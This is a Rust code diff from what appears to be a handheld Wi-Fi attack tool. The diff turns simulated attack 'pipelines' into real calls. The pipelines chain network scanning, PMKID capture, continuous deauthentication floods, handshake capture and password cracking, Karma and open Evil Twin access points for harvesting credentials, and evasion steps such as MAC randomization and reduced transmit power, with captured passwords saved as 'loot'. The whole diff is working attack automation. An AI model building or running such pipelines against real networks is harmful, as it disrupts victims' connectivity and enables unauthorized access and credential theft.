@@ -104,6 +104,17 @@ enum CancelAction {
     GoMainMenu,    // User wants to go to main menu
 }
 
+/// Result from pipeline execution
+struct PipelineResult {
+    cancelled: bool,
+    steps_completed: usize,
+    pmkids_captured: u32,
+    handshakes_captured: u32,
+    password_found: Option<String>,
+    networks_found: u32,
+    clients_found: u32,
+}
+
 // Map low-level Button values to higher-level ButtonAction values
 impl App {
     fn map_button(&self, b: Button) -> ButtonAction {
@@ -2968,34 +2979,78 @@ impl App {
             }
         }
         
-        // Execute pipeline steps with cancel support
+        // Execute pipeline steps using actual attack implementations
+        let result = self.execute_pipeline_steps(pipeline_type, title, &steps)?;
+        
+        // Pipeline complete - show results
+        if result.cancelled {
+            self.show_message("Pipeline Cancelled", [
+                &format!("Stopped at step {}", result.steps_completed + 1),
+                "",
+                "Partial results may be",
+                "saved in loot folder",
+            ])
+        } else {
+            let mut summary = vec![
+                format!("{} finished", title),
+                "".to_string(),
+            ];
+            
+            if result.pmkids_captured > 0 {
+                summary.push(format!("PMKIDs: {}", result.pmkids_captured));
+            }
+            if result.handshakes_captured > 0 {
+                summary.push(format!("Handshakes: {}", result.handshakes_captured));
+            }
+            if let Some(ref password) = result.password_found {
+                summary.push(format!("PASSWORD: {}", password));
+            }
+            if result.networks_found > 0 {
+                summary.push(format!("Networks: {}", result.networks_found));
+            }
+            if result.clients_found > 0 {
+                summary.push(format!("Clients: {}", result.clients_found));
+            }
+            
+            summary.push("".to_string());
+            summary.push("Results in loot/Wireless/".to_string());
+            
+            self.show_message("Pipeline Complete", summary.iter().map(|s| s.as_str()))
+        }
+    }
+    
+    /// Execute the actual pipeline steps using real attack implementations
+    fn execute_pipeline_steps(&mut self, pipeline_type: PipelineType, title: &str, steps: &[&str]) -> Result<PipelineResult> {
+        use rustyjack_core::{Commands, WifiCommand, WifiScanArgs, WifiDeauthArgs, WifiPmkidArgs};
+        
+        let mut result = PipelineResult {
+            cancelled: false,
+            steps_completed: 0,
+            pmkids_captured: 0,
+            handshakes_captured: 0,
+            password_found: None,
+            networks_found: 0,
+            clients_found: 0,
+        };
+        
+        let active_interface = self.config.settings.active_network_interface.clone();
+        let target_bssid = self.config.settings.target_bssid.clone();
+        let target_channel = self.config.settings.target_channel;
+        let target_ssid = self.config.settings.target_network.clone();
         let total_steps = steps.len();
         
         for (i, step) in steps.iter().enumerate() {
-            // Check for cancel at each step
+            // Check for cancel before each step
             match self.check_attack_cancel(title)? {
                 CancelAction::Continue => {}
-                CancelAction::GoBack => {
-                    return self.show_message("Pipeline Cancelled", [
-                        &format!("Stopped at step {}", i + 1),
-                        "",
-                        "Partial results may be",
-                        "saved in loot folder",
-                    ]);
-                }
-                CancelAction::GoMainMenu => {
-                    self.menu_state.home();
-                    return self.show_message("Pipeline Cancelled", [
-                        &format!("Stopped at step {}", i + 1),
-                        "",
-                        "Partial results may be",
-                        "saved in loot folder",
-                    ]);
+                CancelAction::GoBack | CancelAction::GoMainMenu => {
+                    result.cancelled = true;
+                    return Ok(result);
                 }
             }
             
             // Show progress
-            let progress = ((i + 1) as f32 / total_steps as f32) * 100.0;
+            let progress = (i as f32 / total_steps as f32) * 100.0;
             let overlay = self.stats.snapshot();
             self.display.draw_progress_dialog(
                 title,
@@ -3004,46 +3059,473 @@ impl App {
                 &overlay,
             )?;
             
-            // Simulate step execution (actual implementation would call pipeline module)
-            // Each step takes ~2 seconds for now
-            for _ in 0..20 {
-                std::thread::sleep(std::time::Duration::from_millis(100));
-                
-                // Check for cancel during step
-                match self.check_attack_cancel(title)? {
-                    CancelAction::Continue => {}
-                    CancelAction::GoBack => {
-                        return self.show_message("Pipeline Cancelled", [
-                            &format!("Stopped during: {}", step),
-                            "",
-                            "Partial results may be",
-                            "saved in loot folder",
-                        ]);
+            // Execute the step based on pipeline type and step index
+            let step_result = match pipeline_type {
+                PipelineType::GetPassword => {
+                    self.execute_get_password_step(i, &active_interface, &target_bssid, target_channel, &target_ssid)?
+                }
+                PipelineType::MassCapture => {
+                    self.execute_mass_capture_step(i, &active_interface)?
+                }
+                PipelineType::StealthRecon => {
+                    self.execute_stealth_recon_step(i, &active_interface)?
+                }
+                PipelineType::CredentialHarvest => {
+                    self.execute_credential_harvest_step(i, &active_interface, &target_ssid, target_channel)?
+                }
+                PipelineType::FullPentest => {
+                    self.execute_full_pentest_step(i, &active_interface, &target_bssid, target_channel, &target_ssid)?
+                }
+            };
+            
+            // Update result from step
+            if let Some((pmkids, handshakes, password, networks, clients)) = step_result {
+                result.pmkids_captured += pmkids;
+                result.handshakes_captured += handshakes;
+                if password.is_some() {
+                    result.password_found = password;
+                }
+                result.networks_found += networks;
+                result.clients_found += clients;
+            }
+            
+            result.steps_completed = i + 1;
+            
+            // If we found the password in GetPassword pipeline, we can stop early
+            if pipeline_type == PipelineType::GetPassword && result.password_found.is_some() {
+                break;
+            }
+        }
+        
+        Ok(result)
+    }
+    
+    /// Execute a step in the GetPassword pipeline
+    /// Returns (pmkids, handshakes, password, networks, clients)
+    fn execute_get_password_step(&mut self, step: usize, interface: &str, bssid: &str, channel: u8, ssid: &str) 
+        -> Result<Option<(u32, u32, Option<String>, u32, u32)>> 
+    {
+        use rustyjack_core::{Commands, WifiCommand, WifiScanArgs, WifiDeauthArgs, WifiPmkidArgs};
+        
+        match step {
+            0 => {
+                // Step 1: Scan networks
+                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
+                    interface: Some(interface.to_string()),
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("Scanning", cmd, 20)? {
+                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((0, 0, None, count, 0)));
+                }
+            }
+            1 => {
+                // Step 2: PMKID capture
+                if !bssid.is_empty() {
+                    let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
+                        interface: interface.to_string(),
+                        bssid: Some(bssid.to_string()),
+                        ssid: Some(ssid.to_string()),
+                        channel,
+                        duration: 30,
+                    }));
+                    if let Some((_, data)) = self.dispatch_cancellable("PMKID", cmd, 35)? {
+                        let pmkids = data.get("pmkids_captured").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                        return Ok(Some((pmkids, 0, None, 0, 0)));
                     }
-                    CancelAction::GoMainMenu => {
-                        self.menu_state.home();
-                        return self.show_message("Pipeline Cancelled", [
-                            &format!("Stopped during: {}", step),
-                            "",
-                            "Partial results may be",
-                            "saved in loot folder",
-                        ]);
+                }
+            }
+            2 => {
+                // Step 3: Deauth attack
+                if !bssid.is_empty() {
+                    let cmd = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
+                        interface: interface.to_string(),
+                        bssid: bssid.to_string(),
+                        ssid: Some(ssid.to_string()),
+                        client: None,
+                        channel,
+                        packets: 64,
+                        duration: 30,
+                        continuous: true,
+                        interval: 1,
+                    }));
+                    if let Some((_, data)) = self.dispatch_cancellable("Deauth", cmd, 35)? {
+                        let handshakes = if data.get("handshake_captured").and_then(|v| v.as_bool()).unwrap_or(false) { 1 } else { 0 };
+                        return Ok(Some((0, handshakes, None, 0, 0)));
+                    }
+                }
+            }
+            3 => {
+                // Step 4: Handshake capture (continuation of deauth with longer capture)
+                if !bssid.is_empty() {
+                    let cmd = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
+                        interface: interface.to_string(),
+                        bssid: bssid.to_string(),
+                        ssid: Some(ssid.to_string()),
+                        client: None,
+                        channel,
+                        packets: 32,
+                        duration: 60,
+                        continuous: true,
+                        interval: 1,
+                    }));
+                    if let Some((_, data)) = self.dispatch_cancellable("Capture", cmd, 65)? {
+                        let handshakes = if data.get("handshake_captured").and_then(|v| v.as_bool()).unwrap_or(false) { 1 } else { 0 };
+                        return Ok(Some((0, handshakes, None, 0, 0)));
+                    }
+                }
+            }
+            4 => {
+                // Step 5: Quick crack - look for handshake files and try to crack
+                let loot_dir = self.root.join("loot/Wireless");
+                if loot_dir.exists() {
+                    // Find the most recent handshake export
+                    if let Some(handshake_path) = self.find_recent_handshake(&loot_dir) {
+                        use rustyjack_core::cli::WifiCrackArgs;
+                        let cmd = Commands::Wifi(WifiCommand::Crack(WifiCrackArgs {
+                            file: handshake_path.to_string_lossy().to_string(),
+                            ssid: Some(ssid.to_string()),
+                            mode: "quick".to_string(),
+                            wordlist: None,
+                        }));
+                        if let Some((_msg, data)) = self.dispatch_cancellable("Cracking", cmd, 120)? {
+                            if let Some(password) = data.get("password").and_then(|v| v.as_str()) {
+                                return Ok(Some((0, 0, Some(password.to_string()), 0, 0)));
+                            }
+                        }
+                    }
+                }
+            }
+            _ => {}
+        }
+        Ok(None)
+    }
+    
+    /// Execute a step in the MassCapture pipeline
+    fn execute_mass_capture_step(&mut self, step: usize, interface: &str) 
+        -> Result<Option<(u32, u32, Option<String>, u32, u32)>> 
+    {
+        use rustyjack_core::{Commands, WifiCommand, WifiScanArgs, WifiPmkidArgs};
+        
+        match step {
+            0 => {
+                // Step 1: Scan all networks
+                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
+                    interface: Some(interface.to_string()),
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("Scanning", cmd, 35)? {
+                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((0, 0, None, count, 0)));
+                }
+            }
+            1 => {
+                // Step 2: Channel hopping scan (longer passive scan)
+                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
+                    interface: Some(interface.to_string()),
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("Ch. Hop", cmd, 50)? {
+                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((0, 0, None, count, 0)));
+                }
+            }
+            2 => {
+                // Step 3: Multi-target PMKID capture (passive, all networks)
+                let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
+                    interface: interface.to_string(),
+                    bssid: None,
+                    ssid: None,
+                    channel: 0, // Hop through channels
+                    duration: 90,
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("PMKID", cmd, 100)? {
+                    let pmkids = data.get("pmkids_captured").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((pmkids, 0, None, 0, 0)));
+                }
+            }
+            3 => {
+                // Step 4: Continuous capture (probe sniffing for client info)
+                use rustyjack_core::WifiProbeSniffArgs;
+                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
+                    interface: interface.to_string(),
+                    channel: 0,
+                    duration: 60,
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("Capture", cmd, 70)? {
+                    let clients = data.get("unique_clients").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    let networks = data.get("unique_networks").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((0, 0, None, networks, clients)));
+                }
+            }
+            _ => {}
+        }
+        Ok(None)
+    }
+    
+    /// Execute a step in the StealthRecon pipeline
+    fn execute_stealth_recon_step(&mut self, step: usize, interface: &str) 
+        -> Result<Option<(u32, u32, Option<String>, u32, u32)>> 
+    {
+        use rustyjack_core::{Commands, WifiCommand, WifiProbeSniffArgs};
+        
+        match step {
+            0 => {
+                // Step 1: Randomize MAC
+                #[cfg(target_os = "linux")]
+                {
+                    use rustyjack_evasion::MacManager;
+                    if let Ok(mut manager) = MacManager::new(interface) {
+                        let _ = manager.randomize();
+                    }
+                }
+                thread::sleep(Duration::from_secs(2));
+                Ok(Some((0, 0, None, 0, 0)))
+            }
+            1 => {
+                // Step 2: Minimum TX power
+                #[cfg(target_os = "linux")]
+                {
+                    use std::process::Command;
+                    let _ = Command::new("iw")
+                        .args(["dev", interface, "set", "txpower", "fixed", "100"]) // 1 dBm
+                        .output();
+                }
+                thread::sleep(Duration::from_secs(1));
+                Ok(Some((0, 0, None, 0, 0)))
+            }
+            2 => {
+                // Step 3: Passive scan only (no probe requests sent)
+                // Use probe sniff which is passive
+                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
+                    interface: interface.to_string(),
+                    channel: 0,
+                    duration: 60,
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("Passive", cmd, 70)? {
+                    let networks = data.get("unique_networks").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((0, 0, None, networks, 0)));
+                }
+            }
+            3 => {
+                // Step 4: Extended probe sniffing
+                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
+                    interface: interface.to_string(),
+                    channel: 0,
+                    duration: 120,
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("Sniffing", cmd, 130)? {
+                    let clients = data.get("unique_clients").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    let networks = data.get("unique_networks").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((0, 0, None, networks, clients)));
+                }
+            }
+            _ => {}
+        }
+        Ok(None)
+    }
+    
+    /// Execute a step in the CredentialHarvest pipeline
+    fn execute_credential_harvest_step(&mut self, step: usize, interface: &str, ssid: &str, channel: u8) 
+        -> Result<Option<(u32, u32, Option<String>, u32, u32)>> 
+    {
+        use rustyjack_core::{Commands, WifiCommand, WifiProbeSniffArgs, WifiKarmaArgs, WifiEvilTwinArgs};
+        
+        match step {
+            0 => {
+                // Step 1: Probe sniff to find target networks
+                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
+                    interface: interface.to_string(),
+                    channel: 0,
+                    duration: 30,
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("Sniffing", cmd, 40)? {
+                    let networks = data.get("unique_networks").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    let clients = data.get("unique_clients").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((0, 0, None, networks, clients)));
+                }
+            }
+            1 => {
+                // Step 2: Karma attack
+                let cmd = Commands::Wifi(WifiCommand::Karma(WifiKarmaArgs {
+                    interface: interface.to_string(),
+                    duration: 60,
+                    channel: if channel > 0 { channel } else { 6 },
+                    ap_interface: None,
+                    with_ap: false,
+                    ssid_whitelist: None,
+                    ssid_blacklist: None,
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("Karma", cmd, 70)? {
+                    let clients = data.get("victims").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((0, 0, None, 0, clients)));
+                }
+            }
+            2 => {
+                // Step 3: Evil Twin AP
+                if !ssid.is_empty() {
+                    let cmd = Commands::Wifi(WifiCommand::EvilTwin(WifiEvilTwinArgs {
+                        interface: interface.to_string(),
+                        ssid: ssid.to_string(),
+                        channel: if channel > 0 { channel } else { 6 },
+                        duration: 90,
+                        target_bssid: None,
+                        open: true,
+                    }));
+                    if let Some((_, data)) = self.dispatch_cancellable("Evil Twin", cmd, 100)? {
+                        let clients = data.get("clients_connected").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                        let handshakes = data.get("handshakes_captured").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                        return Ok(Some((0, handshakes, None, 0, clients)));
+                    }
+                }
+            }
+            3 => {
+                // Step 4: Captive portal (continuation of Evil Twin)
+                // Evil Twin with open network serves as captive portal
+                thread::sleep(Duration::from_secs(5));
+                Ok(Some((0, 0, None, 0, 0)))
+            }
+            _ => {}
+        }
+        Ok(None)
+    }
+    
+    /// Execute a step in the FullPentest pipeline
+    fn execute_full_pentest_step(&mut self, step: usize, interface: &str, bssid: &str, channel: u8, ssid: &str) 
+        -> Result<Option<(u32, u32, Option<String>, u32, u32)>> 
+    {
+        use rustyjack_core::{Commands, WifiCommand, WifiScanArgs, WifiPmkidArgs, WifiDeauthArgs, WifiProbeSniffArgs, WifiKarmaArgs};
+        
+        match step {
+            0 => {
+                // Step 1: Stealth recon - MAC randomization + passive scan
+                #[cfg(target_os = "linux")]
+                {
+                    use rustyjack_evasion::MacManager;
+                    if let Ok(mut manager) = MacManager::new(interface) {
+                        let _ = manager.randomize();
+                    }
+                }
+                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
+                    interface: interface.to_string(),
+                    channel: 0,
+                    duration: 45,
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("Recon", cmd, 55)? {
+                    let networks = data.get("unique_networks").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    let clients = data.get("unique_clients").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((0, 0, None, networks, clients)));
+                }
+            }
+            1 => {
+                // Step 2: Network mapping (active scan)
+                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
+                    interface: Some(interface.to_string()),
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("Mapping", cmd, 40)? {
+                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((0, 0, None, count, 0)));
+                }
+            }
+            2 => {
+                // Step 3: PMKID harvest
+                let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
+                    interface: interface.to_string(),
+                    bssid: if bssid.is_empty() { None } else { Some(bssid.to_string()) },
+                    ssid: if ssid.is_empty() { None } else { Some(ssid.to_string()) },
+                    channel: if channel > 0 { channel } else { 0 },
+                    duration: 60,
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("PMKID", cmd, 70)? {
+                    let pmkids = data.get("pmkids_captured").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((pmkids, 0, None, 0, 0)));
+                }
+            }
+            3 => {
+                // Step 4: Deauth attacks
+                if !bssid.is_empty() {
+                    let cmd = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
+                        interface: interface.to_string(),
+                        bssid: bssid.to_string(),
+                        ssid: Some(ssid.to_string()),
+                        client: None,
+                        channel,
+                        packets: 64,
+                        duration: 45,
+                        continuous: true,
+                        interval: 1,
+                    }));
+                    if let Some((_, data)) = self.dispatch_cancellable("Deauth", cmd, 55)? {
+                        let handshakes = if data.get("handshake_captured").and_then(|v| v.as_bool()).unwrap_or(false) { 1 } else { 0 };
+                        return Ok(Some((0, handshakes, None, 0, 0)));
+                    }
+                }
+            }
+            4 => {
+                // Step 5: Evil Twin/Karma
+                let cmd = Commands::Wifi(WifiCommand::Karma(WifiKarmaArgs {
+                    interface: interface.to_string(),
+                    duration: 60,
+                    channel: if channel > 0 { channel } else { 6 },
+                    ap_interface: None,
+                    with_ap: false,
+                    ssid_whitelist: None,
+                    ssid_blacklist: None,
+                }));
+                if let Some((_, data)) = self.dispatch_cancellable("Karma", cmd, 70)? {
+                    let clients = data.get("victims").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
+                    return Ok(Some((0, 0, None, 0, clients)));
+                }
+            }
+            5 => {
+                // Step 6: Crack passwords
+                let loot_dir = self.root.join("loot/Wireless");
+                if loot_dir.exists() {
+                    if let Some(handshake_path) = self.find_recent_handshake(&loot_dir) {
+                        use rustyjack_core::cli::WifiCrackArgs;
+                        let cmd = Commands::Wifi(WifiCommand::Crack(WifiCrackArgs {
+                            file: handshake_path.to_string_lossy().to_string(),
+                            ssid: Some(ssid.to_string()),
+                            mode: "quick".to_string(),
+                            wordlist: None,
+                        }));
+                        if let Some((_, data)) = self.dispatch_cancellable("Cracking", cmd, 120)? {
+                            if let Some(password) = data.get("password").and_then(|v| v.as_str()) {
+                                return Ok(Some((0, 0, Some(password.to_string()), 0, 0)));
+                            }
+                        }
+                    }
+                }
+            }
+            _ => {}
+        }
+        Ok(None)
+    }
+    
+    /// Find the most recent handshake export file in loot directory
+    fn find_recent_handshake(&self, loot_dir: &Path) -> Option<PathBuf> {
+        let mut newest: Option<(PathBuf, std::time::SystemTime)> = None;
+        
+        fn scan_for_handshakes(dir: &Path, newest: &mut Option<(PathBuf, std::time::SystemTime)>) {
+            if let Ok(entries) = fs::read_dir(dir) {
+                for entry in entries.flatten() {
+                    let path = entry.path();
+                    if path.is_dir() {
+                        scan_for_handshakes(&path, newest);
+                    } else if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
+                        if name.starts_with("handshake_export_") && name.ends_with(".json") {
+                            if let Ok(meta) = path.metadata() {
+                                if let Ok(modified) = meta.modified() {
+                                    if newest.as_ref().map(|(_, t)| modified > *t).unwrap_or(true) {
+                                        *newest = Some((path.clone(), modified));
+                                    }
+                                }
+                            }
+                        }
                     }
                 }
             }
         }
         
-        // Pipeline complete
-        self.show_message("Pipeline Complete", [
-            &format!("{} finished", title),
-            "",
-            "Results saved to:",
-            "loot/Wireless/",
-            "",
-            "Check Loot menu to view",
-        ])?;
-        
-        Ok(())
+        scan_for_handshakes(loot_dir, &mut newest);
+        newest.map(|(path, _)| path)
     }
     
     /// Toggle MAC randomization auto-enable setting
